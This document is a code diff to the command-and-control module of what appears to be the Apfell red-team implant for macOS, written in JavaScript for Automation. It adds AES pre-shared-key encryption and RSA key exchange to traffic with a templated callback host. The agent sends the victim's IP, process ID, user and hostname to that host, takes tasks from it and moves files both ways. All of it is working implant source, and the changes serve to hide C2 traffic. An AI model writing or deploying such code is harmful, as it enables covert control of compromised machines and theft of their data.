@@ -8,8 +8,102 @@ class customC2 extends baseC2{
         this.get_next_task = "GETNEXTTASK";
         this.post_new_callback = "NEWCALLBACK";
         this.post_response = "POSTRESPONSE";
+        this.post_new_callback_aespsk = "AES_PSK_NEW_CALLBACK";
+        this.post_new_callback_eke_aespsk = "EKE_NEW_CALLBACK";
         this.id_field = "IDSTRING";
         this.host_header = "domain_front";
+        this.aes_psk = "AESPSK"; // base64 encoded key
+		if(this.aes_psk != ""){
+		    this.parameters = $({"type": $.kSecAttrKeyTypeAES});
+            this.raw_key = $.NSData.alloc.initWithBase64Encoding(this.aes_psk);
+            this.cryptokey = $.SecKeyCreateFromData(this.parameters, this.raw_key, Ref());
+		}
+        this.using_key_exchange = "encrypted_exchange_check" == "T";
+        if(this.using_key_exchange){
+            //lets us know if we can decrypt right away or not
+            this.exchanging_keys = true;
+        }else{
+            this.exchanging_keys = false;
+        }
+	}
+	encrypt_message(data){
+	    // takes in the string we're about to send, encrypts it, and returns a new string
+	    //create the encrypt transform variable
+	    var encrypt = $.SecEncryptTransformCreate(this.cryptokey, Ref());
+	    $.SecTransformSetAttribute(encrypt, $.kSecPaddingKey, $.kSecPaddingPKCS7Key, Ref());
+	    $.SecTransformSetAttribute(encrypt, $.kSecEncryptionMode, $.kSecModeCBCKey, Ref());
+        //generate a random IV to use
+	    var IV = $.NSMutableData.dataWithLength(16);
+	    $.SecRandomCopyBytes($.kSecRandomDefault, 16, IV.bytes);
+	    //var IVref = $.CFDataCreate($(), IV, 16);
+	    $.SecTransformSetAttribute(encrypt, $.kSecIVKey, IV, Ref());
+	    // set our data to be encrypted
+	    var cfdata = $.CFDataCreate($.kCFAllocatorDefault, data, data.length);
+        $.SecTransformSetAttribute(encrypt, $.kSecTransformInputAttributeName, cfdata, Ref());
+        var encryptedData = $.SecTransformExecute(encrypt, Ref());
+        // now we need to prepend the IV to the encrypted data before we base64 encode and return it
+        var final_message = IV;
+        final_message.appendData(encryptedData);
+        return final_message.base64EncodedStringWithOptions(0);
+	}
+	decrypt_message(data){
+        //takes in a base64 encoded string to be decrypted and returned
+        //console.log("called decrypt");
+        var nsdata = $.NSData.alloc.initWithBase64Encoding(data);
+        var decrypt = $.SecDecryptTransformCreate(this.cryptokey, Ref());
+        $.SecTransformSetAttribute(decrypt, $.kSecPaddingKey, $.kSecPaddingPKCS7Key, Ref());
+	    $.SecTransformSetAttribute(decrypt, $.kSecEncryptionMode, $.kSecModeCBCKey, Ref());
+	    //console.log("making ranges");
+        //need to extract out the first 16 bytes as the IV and the rest is the message to decrypt
+        var iv_range = $.NSMakeRange(0, 16);
+        var message_range = $.NSMakeRange(16, nsdata.length - 16);
+        //console.log("carving out iv");
+        var iv = nsdata.subdataWithRange(iv_range);
+        //console.log("setting iv");
+        $.SecTransformSetAttribute(decrypt, $.kSecIVKey, iv, Ref());
+        //console.log("carving out rest of message");
+        var message = nsdata.subdataWithRange(message_range);
+        $.SecTransformSetAttribute(decrypt, $.kSecTransformInputAttributeName, message, Ref());
+        //console.log("decrypting");
+        var decryptedData = $.SecTransformExecute(decrypt, Ref());
+        //console.log("making a string from the message");
+        var decrypted_message = $.NSString.alloc.initWithDataEncoding(decryptedData, $.NSUTF8StringEncoding);
+        //console.log(decrypted_message.js);
+        return decrypted_message;
+	}
+	negotiate_key(){
+        // Generate a public/private key pair
+        var parameters = $({"type": $.kSecAttrKeyTypeRSA, "bsiz": $(4096), "perm": false});
+        var privatekey = $.SecKeyCreateRandomKey(parameters, Ref());
+        var publickey = $.SecKeyCopyPublicKey(privatekey);
+        var exported_public = $.SecKeyCopyExternalRepresentation(publickey, Ref());
+        exported_public = exported_public.base64EncodedStringWithOptions(0).js; // get a base64 encoded string version
+        var s = "abcdefghijklmnopqrstuvwxyz";
+	    var session_key = Array(10).join().split(',').map(function() { return s.charAt(Math.floor(Math.random() * s.length)); }).join('');
+	    var initial_message = JSON.stringify({"SESSIONID": session_key, "PUB": exported_public});
+	    //console.log("sending: " + initial_message);
+	    // Encrypt our initial message with sessionID and Public key with the initial AES key
+	    while(true){
+	        try{
+                var base64_pub_encrypted = this.htmlPostData(this.getPostNewCallbackEKE_AES_PSK_Path(apfell.uuid), initial_message);
+                //var base64_pub_encrypted = this.htmlPostData("api/v1.1/crypto/EKE/" + apfell.uuid, initial_message);
+                var pub_encrypted = $.NSData.alloc.initWithBase64Encoding(base64_pub_encrypted);
+                // Decrypt the response with our private key
+                var decrypted_message = $.SecKeyCreateDecryptedData(privatekey, $.kSecKeyAlgorithmRSAEncryptionOAEPSHA1, pub_encrypted, Ref());
+                decrypted_message = $.NSString.alloc.initWithDataEncoding(decrypted_message, $.NSUTF8StringEncoding);
+                //console.log("got back: " + decrypted_message.js);
+                var json_response = JSON.parse(decrypted_message.js);
+                // Adjust our global key information with the newly adjusted session key
+                this.aes_psk = json_response['SESSIONKEY']; // base64 encoded key
+                this.parameters = $({"type": $.kSecAttrKeyTypeAES});
+                this.raw_key = $.NSData.alloc.initWithBase64Encoding(this.aes_psk);
+                this.cryptokey = $.SecKeyCreateFromData(this.parameters, this.raw_key, Ref());
+                this.exchanging_keys = false;
+                return session_key;
+            }catch(error){
+                $.NSThread.sleepForTimeInterval(this.interval);  // don't spin out crazy if the connection fails
+            }
+        }
 	}
 	getRandomMixed(size){
 	    return [...Array(size)].map(i=>(~~(Math.random()*36)).toString(36)).join('');
@@ -21,8 +115,9 @@ class customC2 extends baseC2{
 	    var s = "abcdefghijklmnopqrstuvwxyz";
 	    return Array(size).join().split(',').map(function() { return s.charAt(Math.floor(Math.random() * s.length)); }).join('');
 	}
-	getGetFilePath(id){
+	getGetFilePath(id, cid){
 	    var temp = this.get_file_path.replace(this.id_field, id);
+	    temp = temp.replace(this.id_field, cid);
 	    return this.stringReplaceRandomizations(temp);
 	}
 	getNextTaskPath(id){
@@ -37,12 +132,19 @@ class customC2 extends baseC2{
 	    var temp = this.post_new_callback;
 	    return this.stringReplaceRandomizations(temp);
 	}
+	getPostNewCallbackAES_PSK_Path(){
+        var temp = this.post_new_callback_aespsk.replace(this.id_field, apfell.uuid);
+        return this.stringReplaceRandomizations(temp);
+	}
+	getPostNewCallbackEKE_AES_PSK_Path(ending){
+	    //the replacement field will first be the uuid and then the sessionID
+        var temp = this.post_new_callback_eke_aespsk.replace(this.id_field, ending);
+        return this.stringReplaceRandomizations(temp);
+	}
     stringReplaceRandomizations(string){
         //console.log("called string randomize with: " + string);
         //will get a string like: /admin.php?q=5&page=(N4)&query=(M20)
         var pieces = string.split("("); //[/admin.php?q=5&page=, N4)&query=, M20)]
-        //console.log("Pieces are: " + pieces.toString());
-        //if there are no requested transformations, then we'll have an array of length one and won't do the loop
         var final_string = pieces[0];
         for(var i = 1; i < pieces.length; i++){
             var arg_split = pieces[i].split(")"); //[N4, &query=] and [M20,'']
@@ -85,7 +187,20 @@ class customC2 extends baseC2{
 		//gets back a unique ID
 		var info = {'ip':ip,'pid':pid,'user':user,'host':host,'uuid':apfell.uuid};
 		//calls htmlPostData(url,data) to actually checkin
-		var jsondata = this.htmlPostData(this.getPostNewCallbackPath(), JSON.stringify(info));
+		//var jsondata = this.htmlPostData(this.getPostNewCallbackPath(), JSON.stringify(info));
+		//Encrypt our data
+		//gets back a unique ID
+		if(this.exchanging_keys){
+		    var sessionID = this.negotiate_key();
+		    var jsondata = this.htmlPostData(this.getPostNewCallbackEKE_AES_PSK_Path(sessionID), JSON.stringify(info));
+		    //var jsondata = this.htmlPostData("api/v1.1/crypto/EKE/" + sessionID, JSON.stringify(info));
+		}else if(this.aes_psk != ""){
+		    var jsondata = this.htmlPostData(this.getPostNewCallbackAES_PSK_Path(), JSON.stringify(info));
+            //var jsondata = this.htmlPostData("api/v1.1/crypto/aes_psk/" + apfell.uuid, JSON.stringify(info));
+		}else{
+		    var jsondata = this.htmlPostData(this.getPostNewCallbackPath(), JSON.stringify(info));
+		    //var jsondata = this.htmlPostData("api/v1.1/callbacks/", JSON.stringify(info));
+		}
 		apfell.id = jsondata.id;
 		// if we fail to get an ID number then exit the application
 		if(apfell.id == undefined){ $.NSApplication.sharedApplication.terminate(this); }
@@ -128,12 +243,16 @@ class customC2 extends baseC2{
 		return jsondata;
 	}
 	htmlPostData(urlEnding, sendData){
+	     var url = this.baseurl + urlEnding;
+        //console.log(url);
+        //encrypt our information before sending it
+        if(this.aes_psk != ""){
+            var data = this.encrypt_message(sendData);
+        }else{
+            var data = $.NSString.alloc.initWithUTF8String(sendData);
+        }
 		while(true){
 			try{ //for some reason it sometimes randomly fails to send the data, throwing a JSON error. loop to fix for now
-				//console.log("posting: " + sendData + " to " + urlEnding);
-				var url = this.baseurl + urlEnding;
-				//console.log(url);
-				var data = $.NSString.alloc.initWithUTF8String(sendData);
 				var req = $.NSMutableURLRequest.alloc.initWithURL($.NSURL.URLWithString(url));
 				req.setHTTPMethod($.NSString.alloc.initWithUTF8String("POST"));
 				var postData = data.dataUsingEncodingAllowLossyConversion($.NSString.NSASCIIStringEncoding, true);
@@ -146,10 +265,25 @@ class customC2 extends baseC2{
 				var response = Ref();
 				var error = Ref();
 				var responseData = $.NSURLConnection.sendSynchronousRequestReturningResponseError(req,response,error);
-				var resp = ObjC.unwrap($.NSString.alloc.initWithDataEncoding(responseData, $.NSUTF8StringEncoding));
-				//console.log(resp);
-				var jsondata = JSON.parse(resp);
-				return jsondata;
+				var resp = $.NSString.alloc.initWithDataEncoding(responseData, $.NSUTF8StringEncoding);
+				//console.log("response: " + resp.js);
+				if(!this.exchanging_keys){
+				    //we're not doing the initial key exchange
+				    if(this.aes_psk != ""){
+				        //if we do need to decrypt the response though, do that
+				        resp = ObjC.unwrap(this.decrypt_message(resp));
+                        var jsondata = JSON.parse(resp);
+                        return jsondata;
+				    }else{
+                        //we don't need to decrypt it, so we can just parse and return it
+                        return JSON.parse(resp.js);
+				    }
+
+				}
+				else{
+				    //if we are currently exchanging keys, just return the response so we can decrypt it differently
+                    return resp;
+				}
 			}
 			catch(error){
 			    $.NSThread.sleepForTimeInterval(this.interval);  // don't spin out crazy if the connection fails
@@ -167,9 +301,14 @@ class customC2 extends baseC2{
                 var response = Ref();
                 var error = Ref();
                 var responseData = $.NSURLConnection.sendSynchronousRequestReturningResponseError(req,response,error);
-                return ObjC.unwrap($.NSString.alloc.initWithDataEncoding(responseData, $.NSUTF8StringEncoding));
-	            //var data = ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString(url)),$.NSUTF8StringEncoding));
-	            //return data;
+                var data =$.NSString.alloc.initWithDataEncoding(responseData, $.NSUTF8StringEncoding);
+                if(this.aes_psk != ""){
+                    var decrypted_message = this.decrypt_message(data);
+                }else{
+                    var decrypted_message = data;
+                }
+                //console.log(decrypted_message.js);
+                return decrypted_message.js;
 	        }
 	        catch(error){
 	            $.NSThread.sleepForTimeInterval(this.interval); //wait timeout seconds and try again
@@ -210,7 +349,7 @@ class customC2 extends baseC2{
                     data = handle.readDataOfLength(chunkSize);
                 }
                 var output = "Finished downloading file with id: " + registerFile['file_id'];
-                output += "\nBrowse to /api/v1.0/files/download/" + registerFile['file_id'];
+                output += "\nBrowse to /api/v1.1/files/download/" + registerFile['file_id'];
             }
             else{
                var output = "Failed to register file to download";
@@ -223,7 +362,7 @@ class customC2 extends baseC2{
 	}
 	upload(task, params){
 	    try{
-	        var url = this.getGetFilePath(params);
+	        var url = this.getGetFilePath(params, apfell.id);
 	        //var url = "api/v1.0/files/" + params;
             var file_data = this.htmlGetData(this.baseurl + url);
             if(file_data === undefined){
@@ -241,4 +380,5 @@ class customC2 extends baseC2{
 	}
 }
 //------------- INSTANTIATE OUR C2 CLASS BELOW HERE IN MAIN CODE-----------------------
+ObjC.import('Security');
 C2 = new customC2(callback_interval, "callback_host:callback_port");
